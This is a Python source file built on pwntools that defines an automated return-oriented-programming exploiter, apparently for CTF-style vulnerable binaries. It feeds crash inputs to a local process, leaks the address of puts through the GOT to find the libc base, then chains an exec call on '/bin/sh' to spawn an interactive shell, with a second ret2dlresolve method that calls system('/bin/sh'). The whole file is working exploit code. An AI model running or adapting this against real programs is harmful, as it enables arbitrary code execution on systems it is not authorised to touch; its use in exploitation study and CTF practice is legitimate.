from pwn import *

# context.log_level = 'DEBUG'


class RopExploiter:
    def __init__(self, binary, vuln_details):
        self.binary = binary
        context.binary = self.binary.elf
        self.output = b""
        self.last_output = b""
        self.first_input = b""
        self.inputs = []
        self.control_after_ret = 0
        self.control_before_ret = 0
        self.parse_vuln(vuln_details)

    def parse_vuln(self, vuln_details):
        print(vuln_details)
        self.control_after_ret = vuln_details["control_after_ret"]
        self.control_before_ret = vuln_details["control_before_ret"]
        self.inputs = vuln_details["input"]
        self.output = vuln_details["output"]

    def leak_address_chain(self, rop: ROP):
        bin_elf = self.binary.elf
        rop.call(bin_elf.plt['puts'], [bin_elf.got['puts']])
        rop.call(bin_elf.entry)

    def get_shell_chain(self, rop: ROP):
        exec_func = self.binary.find_exec_function(search_libc=True)
        binsh = self.binary.find_binsh(search_libc=True)
        exit_func = self.binary.find_function("exit", search_libc=True)
        rop.call(exec_func, [binsh])
        rop.call(exit_func)

    def trim_input(self, input):
        ip = b"X" * self.binary.elf.bytes
        chain_length = len(input)
        log.info("total payload length: {}".format(chain_length))
        offset = input.index(ip)
        log.info("buffer offset: {}".format(offset))
        exploit_input = input[0:offset]
        return exploit_input

    def apply_crash_input(self, process, rop, payload_func):
        current_output = b""
        for i, input in enumerate(self.inputs):
            current_output += process.clean()
            if self.first_input == b"" and current_output != b"":
                self.first_input = current_output
            ip = b"X" * self.binary.elf.bytes
            if ip not in input:
                process.send(input)
            else:
                trimmed_input = self.trim_input(input)
                rop.raw(trimmed_input)
                payload_func(rop)
                chain = rop.chain()

                if len(chain) <= self.control_after_ret:
                    process.sendline(chain)
                else:
                    log.error("Not enough space for payload")

        log.info("current output: {}".format(current_output))
        # self.last_output = self.output.replace(current_output, b"")
        # log.info("last output: {}".format(self.last_output))
        log.info("first input: {}".format(self.first_input))

    def exploit(self):
        process = self.binary.elf.process()
        # process = gdb.debug(self.binary.bin_path, '''break main''')

        rop = ROP([self.binary.elf])
        self.apply_crash_input(process, rop, self.leak_address_chain)

        output = process.recvuntil(self.first_input)
        print(output)
        output = output.replace(self.first_input, b"")[-7:]
        print(output)
        leak_bytes = output.replace(b"P", b"")
        leak = unpack(leak_bytes.rstrip().ljust(context.bytes, b'\x00'))
        self.binary.adjust_libc_base(leak, 'puts')

        rop_libc = ROP([self.binary.libc])
        self.apply_crash_input(process, rop_libc, self.get_shell_chain)

        process.interactive()

    def ret2dlresolve_payload(self, rop):
        dlresolve = Ret2dlresolvePayload(self.binary.elf, symbol='system', args=['/bin/sh'])
        # rop.read(0, dlresolve.data_addr)
        rop.gets(dlresolve.data_addr)
        rop.ret2dlresolve(dlresolve)

    def ret2dlresolve(self):
        dlresolve = Ret2dlresolvePayload(self.binary.elf, symbol='system', args=['/bin/sh'])
        process = self.binary.elf.process()
        rop = ROP([self.binary.elf])
        self.apply_crash_input(process, rop, self.ret2dlresolve_payload)
        process.sendline(dlresolve.payload)

        process.interactive()
